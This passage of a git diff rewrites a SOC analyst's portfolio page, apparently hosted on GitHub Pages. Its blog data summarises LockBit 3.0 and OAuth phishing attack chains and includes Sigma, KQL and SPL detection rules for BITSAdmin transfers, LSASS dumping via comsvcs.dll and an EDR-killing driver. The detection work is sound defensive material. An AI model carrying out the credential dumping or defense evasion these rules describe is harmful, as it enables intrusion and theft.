+        <a href="https://medium.com/@swethasec" target="_blank" class="btn-ghost"><i class="fab fa-medium"></i> Medium</a>
+        <a href="#research" class="btn-ghost"><i class="fas fa-book-open"></i> Research</a>
+        <a href="mailto:swethadevi1125@gmail.com" class="btn-solid"><i class="fas fa-envelope"></i> Get in Touch</a>
+      </div>
+      <div class="stats-bar reveal" style="transition-delay:.2s">
+        <div class="stat"><div class="stat-num" data-count="6">0</div><div class="stat-label">Client Environments</div></div>
+        <div class="stat"><div class="stat-num" data-count="96" data-suffix="%">0</div><div class="stat-label">Detection Accuracy</div></div>
+        <div class="stat"><div class="stat-num" data-count="32" data-suffix="%">0</div><div class="stat-label">False Positive Reduction</div></div>
+        <div class="stat"><div class="stat-num" data-count="4">0</div><div class="stat-label">Published Research</div></div>
       </div>
     </div>
-
-    <!-- About Section -->
-    <section id="about">
-      <h2 class="section-title">About Me</h2>
-      <div class="card" data-aos="fade-up">
-        <div class="about-content">
-          <p>I am a SOC Analyst and Detection Engineer with a focus on offensive-informed defense. I specialize in investigating complex attack chains, writing Sigma and YARA rules, and building automated detection workflows. I map incidents to the MITRE ATT&CK framework, analyze malware, and develop proactive threat hunting strategies.</p>
-          <p style="margin-top: 16px;">On this platform, you will find my detailed research on real-world TTPs, detection queries, and incident response playbooks. I am passionate about improving threat detection quality and operational efficiency in security operations centers.</p>
-          <div style="margin-top: 20px;"><strong>Core Toolset:</strong> Splunk Enterprise Security, Elastic Stack, CrowdStrike, Wireshark, Python, Suricata, Zeek, Velociraptor, KQL.</div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Skills & Tools Section -->
-    <section id="skills">
-      <h2 class="section-title">Skills & Tools</h2>
-      <div class="skills-grid">
-        <div class="card skill-category">
-          <h3>Detection Engineering</h3>
-          <div class="skill-items">
-            <span class="skill-item">Sigma Rules</span>
-            <span class="skill-item">YARA</span>
-            <span class="skill-item">KQL / SPL</span>
-            <span class="skill-item">Atomic Red Team</span>
-            <span class="skill-item">Sysmon</span>
-          </div>
-        </div>
-        <div class="card skill-category">
-          <h3>SIEM & EDR</h3>
-          <div class="skill-items">
-            <span class="skill-item">Splunk ES</span>
-            <span class="skill-item">Elastic Security</span>
-            <span class="skill-item">Cortex XDR</span>
-            <span class="skill-item">Microsoft Sentinel</span>
-          </div>
-        </div>
-        <div class="card skill-category">
-          <h3>Automation & Scripting</h3>
-          <div class="skill-items">
-            <span class="skill-item">Python</span>
-            <span class="skill-item">Bash / PowerShell</span>
-            <span class="skill-item">Jupyter Notebooks</span>
-            <span class="skill-item">REST APIs</span>
-          </div>
-        </div>
-        <div class="card skill-category">
-          <h3>Threat Intelligence</h3>
-          <div class="skill-items">
-            <span class="skill-item">MITRE ATT&CK</span>
-            <span class="skill-item">Cyber Kill Chain</span>
-            <span class="skill-item">MISP</span>
-            <span class="skill-item">VirusTotal</span>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Experience Section -->
-    <section id="experience">
-      <h2 class="section-title">Experience</h2>
-      <div class="timeline">
-        <div class="timeline-item" data-aos="fade-right">
-          <h3>Cybersecurity Analyst</h3>
-          <div class="period">TriArmour AI — November 2024 – Present</div>
-          <p>Monitor 6+ client environments using Splunk and Elastic with 96% detection accuracy. Correlated Windows Event Logs, Sysmon, and EDR telemetry to uncover brute-force attacks, lateral movement, and privilege escalation. Authored custom detection rules, reduced false positives by 32%, and mapped incidents to MITRE ATT&CK framework.</p>
-        </div>
-        <div class="timeline-item" data-aos="fade-right">
-          <h3>Cybersecurity Intern</h3>
-          <div class="period">GradeSpot IT — September 2023 – March 2024</div>
-          <p>Performed vulnerability assessments using Nessus, identifying high-risk misconfigurations. Completed hands-on training in ethical hacking and SOC operations. Contributed to security awareness training development and incident response playbook documentation.</p>
-        </div>
-      </div>
-    </section>
-
-    <!-- Research Blog Section -->
-    <section id="research-blog">
-      <h2 class="section-title">Research Blog: Attack Deep Dives</h2>
-      <p style="margin-bottom: 28px;">In-depth analysis covering attack chain, methodology, impact, response actions, and detection queries (Sigma/KQL).</p>
-      <div id="blogGridContainer" class="blog-grid"></div>
-    </section>
-
-    <!-- Connect Section -->
-    <section id="connect">
-      <h2 class="section-title">Connect With Me</h2>
-      <div class="contact-grid">
-        <div class="contact-item" data-aos="fade-up">
-          <div class="contact-icon"><i class="fas fa-envelope"></i></div>
-          <h3>Email</h3>
-          <a href="mailto:swethadevi1125@gmail.com" style="color: var(--text-muted); text-decoration: none;">swethadevi1125@gmail.com</a>
-        </div>
-        <div class="contact-item" data-aos="fade-up">
-          <div class="contact-icon"><i class="fab fa-linkedin"></i></div>
-          <h3>LinkedIn</h3>
-          <a href="https://linkedin.com/in/bonu-swetha-devi-sai-priya" target="_blank" style="color: var(--text-muted); text-decoration: none;">Connect on LinkedIn</a>
-        </div>
-        <div class="contact-item" data-aos="fade-up">
-          <div class="contact-icon"><i class="fab fa-github"></i></div>
-          <h3>GitHub</h3>
-          <a href="https://github.com/unabletofind" target="_blank" style="color: var(--text-muted); text-decoration: none;">View Projects</a>
-        </div>
-        <div class="contact-item" data-aos="fade-up">
-          <div class="contact-icon"><i class="fab fa-medium"></i></div>
-          <h3>Medium</h3>
-          <a href="https://medium.com/@swethasec" target="_blank" style="color: var(--text-muted); text-decoration: none;">Read Articles</a>
-        </div>
-      </div>
-      <div class="card" data-aos="fade-up" style="margin-top: 30px;">
-        <div class="connect-links">
-          <a href="#" id="resumeDownloadBtn" class="btn-outline"><i class="fas fa-file-pdf"></i> Download Resume</a>
-          <a href="#research-blog" class="btn-outline"><i class="fas fa-blog"></i> All Research Blogs</a>
-          <a href="mailto:swethadevi1125@gmail.com" class="btn-outline"><i class="fas fa-paper-plane"></i> Send Message</a>
-        </div>
-        <p style="margin-top: 20px;">Open to threat intelligence collaboration, detection engineering challenges, and speaking opportunities.</p>
-      </div>
-    </section>
   </div>
-  <footer>
-    <p>© 2025 Swetha Devi — SOC Analyst & Detection Engineer | Built for GitHub Pages</p>
-  </footer>
-</main>
+</section>
 
-<!-- Modal for research subpages -->
-<div id="researchModal" class="modal">
-  <div class="modal-content">
-    <span class="close-modal">&times;</span>
-    <div id="modalDynamicContent"></div>
-    <hr />
-    <p><a href="#" id="modalBackLink" style="color: var(--accent); text-decoration: none;"><i class="fas fa-arrow-left"></i> Back to research list</a></p>
+<!-- TICKER -->
+<div class="ticker-section">
+  <div class="container">
+    <div class="ticker-inner">
+      <div class="ticker-label">LIVE INTEL</div>
+      <div class="ticker-track">
+        <div class="ticker-items" id="tickerItems"></div>
+      </div>
+    </div>
   </div>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+<!-- ABOUT -->
+<section id="about">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div>
+        <div class="sec-tag">// 01 — About</div>
+        <h2 class="sec-title">Terminal Bio</h2>
+      </div>
+      <div class="sec-line"></div>
+    </div>
+    <div class="terminal reveal">
+      <div class="term-bar">
+        <div class="term-dot" style="background:#f43f5e"></div>
+        <div class="term-dot" style="background:#f59e0b"></div>
+        <div class="term-dot" style="background:#00ffc6"></div>
+        <span style="margin-left:8px;font-family:var(--mono);font-size:12px;color:var(--muted)">swetha@soc-station:~</span>
+      </div>
+      <div class="term-body" id="termBody"></div>
+    </div>
+  </div>
+</section>
+
+<!-- SKILLS -->
+<section id="skills">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div>
+        <div class="sec-tag">// 02 — Arsenal</div>
+        <h2 class="sec-title">Skills & Tools</h2>
+      </div>
+      <div class="sec-line"></div>
+    </div>
+    <div class="skills-grid">
+
+      <div class="skill-card reveal">
+        <div class="skill-card-head">
+          <div class="skill-icon" style="background:rgba(0,255,198,0.1);color:var(--accent)"><i class="fas fa-crosshairs"></i></div>
+          <div class="skill-title">Detection Engineering</div>
+        </div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Sigma Rules</span><span class="skill-bar-pct">92%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="92"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">YARA</span><span class="skill-bar-pct">85%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="85"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">KQL / SPL</span><span class="skill-bar-pct">88%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="88"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Atomic Red Team</span><span class="skill-bar-pct">78%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="78"></div></div></div>
+      </div>
+
+      <div class="skill-card reveal" style="transition-delay:.1s">
+        <div class="skill-card-head">
+          <div class="skill-icon" style="background:rgba(14,165,233,0.1);color:var(--accent2)"><i class="fas fa-server"></i></div>
+          <div class="skill-title">SIEM & EDR</div>
+        </div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Splunk ES</span><span class="skill-bar-pct">90%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="90"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Elastic Security</span><span class="skill-bar-pct">86%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="86"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Microsoft Sentinel</span><span class="skill-bar-pct">80%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="80"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Cortex XDR</span><span class="skill-bar-pct">74%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="74"></div></div></div>
+      </div>
+
+      <div class="skill-card reveal" style="transition-delay:.2s">
+        <div class="skill-card-head">
+          <div class="skill-icon" style="background:rgba(245,158,11,0.1);color:var(--amber)"><i class="fas fa-code"></i></div>
+          <div class="skill-title">Automation & Scripting</div>
+        </div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Python</span><span class="skill-bar-pct">84%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="84"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Bash / PowerShell</span><span class="skill-bar-pct">80%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="80"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">REST APIs</span><span class="skill-bar-pct">76%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="76"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Jupyter Notebooks</span><span class="skill-bar-pct">72%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="72"></div></div></div>
+      </div>
+
+      <div class="skill-card reveal" style="transition-delay:.3s">
+        <div class="skill-card-head">
+          <div class="skill-icon" style="background:rgba(244,63,94,0.1);color:var(--red)"><i class="fas fa-spider"></i></div>
+          <div class="skill-title">Threat Intelligence</div>
+        </div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">MITRE ATT&CK</span><span class="skill-bar-pct">93%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="93"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">MISP</span><span class="skill-bar-pct">78%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="78"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">VirusTotal / OTX</span><span class="skill-bar-pct">85%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="85"></div></div></div>
+        <div class="skill-bar-item"><div class="skill-bar-top"><span class="skill-bar-name">Cyber Kill Chain</span><span class="skill-bar-pct">88%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" data-w="88"></div></div></div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- EXPERIENCE -->
+<section id="experience">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div>
+        <div class="sec-tag">// 03 — Timeline</div>
+        <h2 class="sec-title">Experience</h2>
+      </div>
+      <div class="sec-line"></div>
+    </div>
+    <div class="timeline">
+      <div class="tl-item reveal">
+        <div class="tl-dot"></div>
+        <div class="tl-head">
+          <div>
+            <div class="tl-title">Cybersecurity Analyst</div>
+            <div class="tl-company"><i class="fas fa-building" style="font-size:11px"></i> TriArmour AI</div>
+          </div>
+          <div class="tl-period">Nov 2024 – Present</div>
+        </div>
+        <div class="tl-body">Monitor 6+ client environments using Splunk and Elastic with 96% detection accuracy. Correlated Windows Event Logs, Sysmon, and EDR telemetry to uncover brute-force attacks, lateral movement, and privilege escalation. Authored custom detection rules, reduced false positives by 32%, and mapped incidents to the MITRE ATT&CK framework.</div>
+        <div class="tl-tags">
+          <span class="tl-tag">Splunk ES</span>
+          <span class="tl-tag">Elastic</span>
+          <span class="tl-tag">Sysmon</span>
+          <span class="tl-tag">MITRE ATT&CK</span>
+          <span class="tl-tag">Sigma</span>
+        </div>
+      </div>
+      <div class="tl-item reveal" style="transition-delay:.1s">
+        <div class="tl-dot" style="background:var(--accent2);box-shadow:0 0 10px rgba(14,165,233,0.5)"></div>
+        <div class="tl-head">
+          <div>
+            <div class="tl-title">Cybersecurity Intern</div>
+            <div class="tl-company"><i class="fas fa-building" style="font-size:11px"></i> GradeSpot IT</div>
+          </div>
+          <div class="tl-period" style="color:var(--accent2);background:rgba(14,165,233,0.08);border-color:rgba(14,165,233,0.2)">Sep 2023 – Mar 2024</div>
+        </div>
+        <div class="tl-body">Performed vulnerability assessments using Nessus, identifying high-risk misconfigurations. Completed hands-on training in ethical hacking and SOC operations. Contributed to security awareness training development and incident response playbook documentation.</div>
+        <div class="tl-tags">
+          <span class="tl-tag">Nessus</span>
+          <span class="tl-tag">Ethical Hacking</span>
+          <span class="tl-tag">Vulnerability Assessment</span>
+          <span class="tl-tag">IR Playbooks</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- RESEARCH BLOG -->
+<section id="research">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div>
+        <div class="sec-tag">// 04 — Research</div>
+        <h2 class="sec-title">Attack Deep Dives</h2>
+      </div>
+      <div class="sec-line"></div>
+    </div>
+    <p class="reveal" style="color:var(--muted);margin-bottom:32px;font-size:14px">In-depth analysis covering attack chain, methodology, impact, response, and detection queries.</p>
+    <div class="blog-grid" id="blogGrid"></div>
+  </div>
+</section>
+
+<!-- CONNECT -->
+<section id="connect">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div>
+        <div class="sec-tag">// 05 — Contact</div>
+        <h2 class="sec-title">Connect</h2>
+      </div>
+      <div class="sec-line"></div>
+    </div>
+    <div class="connect-grid reveal">
+      <a href="mailto:swethadevi1125@gmail.com" class="connect-card">
+        <div class="connect-icon"><i class="fas fa-envelope"></i></div>
+        <div class="connect-name">Email</div>
+        <div class="connect-sub">swethadevi1125@gmail.com</div>
+      </a>
+      <a href="https://linkedin.com/in/bonu-swetha-devi-sai-priya" target="_blank" class="connect-card">
+        <div class="connect-icon"><i class="fab fa-linkedin"></i></div>
+        <div class="connect-name">LinkedIn</div>
+        <div class="connect-sub">Connect professionally</div>
+      </a>
+      <a href="https://github.com/unabletofind" target="_blank" class="connect-card">
+        <div class="connect-icon"><i class="fab fa-github"></i></div>
+        <div class="connect-name">GitHub</div>
+        <div class="connect-sub">Detection rules & tools</div>
+      </a>
+      <a href="https://medium.com/@swethasec" target="_blank" class="connect-card">
+        <div class="connect-icon"><i class="fab fa-medium"></i></div>
+        <div class="connect-name">Medium</div>
+        <div class="connect-sub">Security articles</div>
+      </a>
+    </div>
+    <div style="margin-top:24px;padding:28px;background:var(--surface);border:1px solid var(--border);border-radius:16px;" class="reveal">
+      <p style="color:var(--muted);font-size:14px;margin-bottom:18px">Open to threat intelligence collaboration, detection engineering challenges, and speaking opportunities.</p>
+      <div style="display:flex;flex-wrap:wrap;gap:12px">
+        <a href="#" class="btn-ghost" id="dlResume"><i class="fas fa-file-pdf"></i> Download Resume</a>
+        <a href="#research" class="btn-ghost"><i class="fas fa-blog"></i> All Research</a>
+        <a href="mailto:swethadevi1125@gmail.com" class="btn-solid"><i class="fas fa-paper-plane"></i> Send Message</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <p>© 2025 <span>Swetha Devi</span> — SOC Analyst & Detection Engineer &nbsp;·&nbsp; Built with passion for security</p>
+  </div>
+</footer>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal">
+  <div class="modal-box">
+    <div class="modal-top-bar">
+      <div class="modal-title-row">
+        <div style="width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent)"></div>
+        <span style="font-family:var(--mono);font-size:12px;color:var(--muted)">research/deep-dive</span>
+      </div>
+      <button class="modal-close" id="modalClose"><i class="fas fa-times"></i></button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
 <script>
-  AOS.init({ duration: 800, once: false, mirror: true });
-
-  // Live typing effect
-  const roles = [
-    "SOC Analyst | Threat Detection",
-    "Detection Engineer | Sigma & YARA",
-    "Incident Response & Forensics",
-    "Threat Hunter | MITRE ATT&CK"
-  ];
-  let roleIndex = 0;
-  let charIndex = 0;
-  let isDeleting = false;
-  const typingElement = document.getElementById("typingElement");
-
-  function typeEffect() {
-    if (!typingElement) return;
-    const currentRole = roles[roleIndex];
-    if (isDeleting) {
-      typingElement.textContent = currentRole.substring(0, charIndex - 1);
-      charIndex--;
-      if (charIndex === 0) {
-        isDeleting = false;
-        roleIndex = (roleIndex + 1) % roles.length;
-        setTimeout(typeEffect, 200);
-      } else {
-        setTimeout(typeEffect, 60);
-      }
-    } else {
-      typingElement.textContent = currentRole.substring(0, charIndex + 1);
-      charIndex++;
-      if (charIndex === currentRole.length) {
-        isDeleting = true;
-        setTimeout(typeEffect, 1800);
-      } else {
-        setTimeout(typeEffect, 90);
+/* ── PARTICLE CANVAS ── */
+const canvas=document.getElementById('bgCanvas');
+const ctx=canvas.getContext('2d');
+let W,H,particles=[];
+function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight}
+resize();window.addEventListener('resize',resize);
+function randBetween(a,b){return a+Math.random()*(b-a)}
+function initParticles(){
+  particles=[];
+  const count=Math.floor(W*H/18000);
+  for(let i=0;i<count;i++){
+    particles.push({
+      x:Math.random()*W,y:Math.random()*H,
+      vx:randBetween(-.18,.18),vy:randBetween(-.12,.12),
+      r:randBetween(.8,2.2),
+      color:Math.random()>.6?'rgba(0,255,198,':'rgba(14,165,233,',
+      alpha:randBetween(.2,.7)
+    });
+  }
+}
+initParticles();
+function drawParticles(){
+  ctx.clearRect(0,0,W,H);
+  particles.forEach(p=>{
+    p.x+=p.vx;p.y+=p.vy;
+    if(p.x<0)p.x=W;if(p.x>W)p.x=0;
+    if(p.y<0)p.y=H;if(p.y>H)p.y=0;
+    ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fillStyle=p.color+p.alpha+')';ctx.fill();
+  });
+  particles.forEach((p,i)=>{
+    for(let j=i+1;j<particles.length;j++){
+      const q=particles[j];
+      const d=Math.hypot(p.x-q.x,p.y-q.y);
+      if(d<110){
+        ctx.beginPath();ctx.moveTo(p.x,p.y);ctx.lineTo(q.x,q.y);
+        ctx.strokeStyle=`rgba(0,255,198,${.06*(1-d/110)})`;
+        ctx.lineWidth=.5;ctx.stroke();
       }
     }
-  }
-  setTimeout(typeEffect, 400);
+  });
+  requestAnimationFrame(drawParticles);
+}
+drawParticles();
 
-  // Research data
-  const researchArticles = [
-    {
-      id: "lockbit-ransomware",
-      title: "LockBit 3.0 Ransomware: Complete Attack Chain",
-      date: "March 2025",
-      excerpt: "Double extortion tactics, defense evasion, and Sigma rules to detect LockBit affiliates in enterprise environments.",
-      content: `
-        <h2>LockBit 3.0 Ransomware Deep Dive</h2>
-        <h3>Attack Chain</h3>
-        <p>Initial Access (RDP brute-force / phishing) → Privilege Escalation (UAC bypass) → Defense Evasion (Terminator driver kills EDR) → Lateral Movement (PsExec, WMI) → Data Exfiltration (Mega, rclone) → Encryption (.lockbit extension).</p>
-        <h3>Methodology & TTPs</h3>
-        <p>Adversary leverages living-off-the-land binaries (certutil, BITSAdmin). MITRE: T1562.001 (Disable or Modify Tools), T1021.002 (SMB/Windows Admin Shares). Disables Windows Defender and SIEM agents.</p>
-        <h3>Impact</h3>
-        <p>Critical data leakage, prolonged operational downtime, multi-million dollar ransom demands across healthcare, finance, and energy sectors.</p>
-        <h3>Response Actions</h3>
-        <p>Immediate containment: isolate affected hosts, revoke compromised credentials, restore from immutable backups. Block IOCs (C2 domains, file hashes), hunt for LOLBin anomalies.</p>
-        <h3>Detection Rules / Queries</h3>
-        <pre>// Sigma rule: Suspicious BITSAdmin transfer
-title: BITSAdmin Unusual Transfer
-logsource: product: windows
+/* ── TYPEWRITER ── */
+const tw=document.getElementById('tw-text');
+const roles=['SOC Analyst · Threat Detection','Detection Engineer · Sigma & YARA','Incident Responder · Forensics','Threat Hunter · MITRE ATT&CK'];
+let ri=0,ci=0,del=false;
+function type(){
+  const cur=roles[ri];
+  if(del){tw.textContent=cur.slice(0,--ci);if(!ci){del=false;ri=(ri+1)%roles.length;setTimeout(type,300);return}}
+  else{tw.textContent=cur.slice(0,++ci);if(ci===cur.length){del=true;setTimeout(type,2000);return}}
+  setTimeout(type,del?55:90);
+}
+setTimeout(type,600);
+
+/* ── TICKER ── */
+const threats=[
+  {sev:'CRITICAL',msg:'LockBit 3.0 affiliate targeting healthcare sector via RDP'},
+  {sev:'HIGH',msg:'ProxyNotShell exploitation detected in Exchange 2019'},
+  {sev:'CRITICAL',msg:'New UEFI bootkit bypassing Secure Boot on Dell/HP systems'},
+  {sev:'HIGH',msg:'APT29 OAuth consent phishing campaign active in O365 tenants'},
+  {sev:'MEDIUM',msg:'Log4j scanning uptick — 48h spike in JNDI probe requests'},
+  {sev:'HIGH',msg:'Lazarus group deploying fake trading app macOS malware'},
+  {sev:'CRITICAL',msg:'MOVEit zero-day chained with Cl0p ransomware delivery'},
+  {sev:'MEDIUM',msg:'New BYOVD campaign using deprecated Gigabyte driver'},
+  {sev:'HIGH',msg:'Scattered Spider SIM-swap attacks on telco help desks resurging'},
+  {sev:'MEDIUM',msg:'Living-off-the-land: certutil & BITSAdmin abuse increasing'},
+];
+function buildTicker(){
+  const t=document.getElementById('tickerItems');
+  const items=[...threats,...threats];
+  t.innerHTML=items.map(i=>`
+    <span class="ticker-item">
+      <span class="ticker-sev ${i.sev==='CRITICAL'?'sev-crit':i.sev==='HIGH'?'sev-high':'sev-med'}">${i.sev}</span>
+      ${i.msg}
+    </span>
+  `).join('');
+}
+buildTicker();
+
+/* ── TERMINAL BIO ── */
+const termLines=[
+  {t:100,html:`<span class="tc-green">swetha@soc-station</span><span class="tc-gray">:</span><span class="tc-blue">~</span><span class="tc-gray"> $ </span><span class="tc-white">cat whoami.txt</span>`},
+  {t:700,html:`<br><span class="tc-yellow">[ IDENTITY ]</span>`},
+  {t:900,html:`<span class="tc-gray">Name    :</span> <span class="tc-white">Swetha Devi Sai Priya Bonu</span>`},
+  {t:1100,html:`<span class="tc-gray">Role    :</span> <span class="tc-green">SOC Analyst & Detection Engineer</span>`},
+  {t:1300,html:`<span class="tc-gray">Location:</span> <span class="tc-white">Hyderabad, India</span>`},
+  {t:1500,html:`<span class="tc-gray">Focus   :</span> <span class="tc-blue">Offensive-Informed Defense · ATT&CK Mapping · IR</span>`},
+  {t:1800,html:`<br><span class="tc-yellow">[ TOOLSET ]</span>`},
+  {t:2000,html:`<span class="tc-gray">SIEM    :</span> <span class="tc-green">Splunk ES · Elastic Security · Microsoft Sentinel</span>`},
+  {t:2200,html:`<span class="tc-gray">EDR     :</span> <span class="tc-green">CrowdStrike · Cortex XDR · Velociraptor</span>`},
+  {t:2400,html:`<span class="tc-gray">Hunt    :</span> <span class="tc-green">Sigma · YARA · KQL · Sysmon · Zeek · Suricata</span>`},
+  {t:2700,html:`<br><span class="tc-yellow">[ MISSION ]</span>`},
+  {t:2900,html:`<span class="tc-gray">» </span><span class="tc-white">Reduce adversary dwell time through precision detection</span>`},
+  {t:3100,html:`<span class="tc-gray">» </span><span class="tc-white">Write rules that catch real attacks, not just test data</span>`},
+  {t:3300,html:`<span class="tc-gray">» </span><span class="tc-white">Bridge the gap between threat intel and SOC response</span>`},
+  {t:3600,html:`<br><span class="tc-green">swetha@soc-station</span><span class="tc-gray">:</span><span class="tc-blue">~</span><span class="tc-gray"> $ </span><span class="tc-green">█</span>`},
+];
+let termStarted=false;
+function startTerminal(){
+  if(termStarted)return;termStarted=true;
+  const body=document.getElementById('termBody');
+  termLines.forEach(({t,html})=>{
+    setTimeout(()=>{
+      const div=document.createElement('div');
+      div.className='term-line';div.innerHTML=html;
+      div.style.animationDelay='0s';
+      body.appendChild(div);
+      body.scrollTop=body.scrollHeight;
+    },t);
+  });
+}
+
+/* ── BLOG DATA ── */
+const blogs=[
+  {
+    id:'lockbit',cat:'Ransomware',
+    title:'LockBit 3.0: Complete Attack Chain',
+    date:'March 2025',
+    excerpt:'Double extortion tactics, defense evasion via Terminator driver, and Sigma rules to detect LockBit affiliates in enterprise environments.',
+    mitre:['T1562.001','T1021.002','T1486','T1070'],
+    content:`
+      <h2>LockBit 3.0 Ransomware — Deep Dive</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;March 2025</p>
+      <hr>
+      <h3>Attack Chain</h3>
+      <p>Initial Access via RDP brute-force or phishing → Privilege Escalation using UAC bypass → Defense Evasion (Terminator driver kills EDR processes) → Lateral Movement via PsExec and WMI → Data Exfiltration using Mega/rclone → Encryption with .lockbit extension.</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1562.001 — Disable/Modify Tools</span>
+        <span class="mitre-tag">T1021.002 — SMB/Admin Shares</span>
+        <span class="mitre-tag">T1486 — Data Encrypted for Impact</span>
+        <span class="mitre-tag">T1070 — Indicator Removal</span>
+        <span class="mitre-tag">T1059 — Command & Scripting Interpreter</span>
+      </div>
+      <h3>Methodology & TTPs</h3>
+      <p>Adversary leverages living-off-the-land binaries: certutil, BITSAdmin, mshta.exe. Disables Windows Defender, SIEM agents, and backup services. Drops Terminator.sys (BYOVD) to kill EDR kernel callbacks. Uses LOTL for C2 communication.</p>
+      <h3>Impact</h3>
+      <p>Critical data leakage, prolonged operational downtime, multi-million dollar ransom demands targeting healthcare, finance, and energy sectors globally.</p>
+      <h3>Incident Response Actions</h3>
+      <p>Immediate containment: isolate affected hosts, revoke compromised credentials. Restore from immutable backups offline. Block IOCs (C2 domains, driver hashes), hunt for LOLBin anomalies, check scheduled tasks and services.</p>
+      <h3>Detection Rules</h3>
+      <pre>// Sigma — Suspicious BITSAdmin Transfer
+title: BITSAdmin Unusual File Transfer
+logsource:
+  product: windows
+  category: process_creation
 detection:
   selection:
-    Image|endswith: 'bitsadmin.exe'
+    Image|endswith: '\\bitsadmin.exe'
     CommandLine|contains: '/transfer'
   condition: selection
+level: high
 
-// KQL: LSASS Dump detection
+// KQL — LSASS Dump Detection
 DeviceProcessEvents
-| where ProcessCommandLine contains "comsvcs.dll" and ProcessCommandLine contains "MiniDump"</pre>
-      `
-    },
-    {
-      id: "oauth-phishing",
-      title: "OAuth Consent Phishing (APT29 Style)",
-      date: "February 2025",
-      excerpt: "Abusing OAuth apps for token theft, MFA bypass techniques, detection queries, and incident response steps.",
-      content: `
-        <h2>OAuth Phishing: Adversary-in-the-Middle Attack Chain</h2>
-        <h3>Attack Chain</h3>
-        <p>Spear-phishing link → rogue OAuth app consent → token theft → persistent access via refresh tokens → mailbox rule exfiltration.</p>
-        <h3>Methodology</h3>
-        <p>Threat actor uses device code flow, mimics legitimate Microsoft login page. MITRE T1550.001 (Application Access Token). Bypasses MFA by stealing authenticated session tokens.</p>
-        <h3>Impact</h3>
-        <p>Full cloud mailbox compromise, stealthy persistence without password reset, data exfiltration from SharePoint and OneDrive.</p>
-        <h3>Response Actions</h3>
-        <p>Revoke malicious OAuth grants, enforce Conditional Access policies, require FIDO2 keys, audit application permissions enterprise-wide.</p>
-        <h3>Detection Queries</h3>
-        <pre>// KQL: Unusual OAuth consent
+| where ProcessCommandLine contains "comsvcs.dll"
+  and ProcessCommandLine contains "MiniDump"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+
+// SPL — Terminator BYOVD Driver
+index=wineventlog EventCode=7045
+| eval svc=lower(ServiceName)
+| where svc="zamguard64" OR svc="zam64"</pre>
+    `
+  },
+  {
+    id:'oauth',cat:'Cloud / Identity',
+    title:'OAuth Consent Phishing (APT29 Style)',
+    date:'February 2025',
+    excerpt:'Abusing OAuth apps for token theft, MFA bypass via device code flow, detection queries, and incident response steps.',
+    mitre:['T1550.001','T1111','T1114'],
+    content:`
+      <h2>OAuth Consent Phishing — APT29 Technique</h2>
+      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;February 2025</p>
+      <hr>
+      <h3>Attack Chain</h3>
+      <p>Spear-phishing link → rogue OAuth app consent granted by victim → access token + refresh token theft → persistent mailbox access → forwarding rules created → data exfiltrated from SharePoint/OneDrive.</p>
+      <h3>MITRE ATT&CK Coverage</h3>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1550.001 — Application Access Token</span>
+        <span class="mitre-tag">T1111 — MFA Interception</span>
+        <span class="mitre-tag">T1114.002 — Remote Email Collection</span>
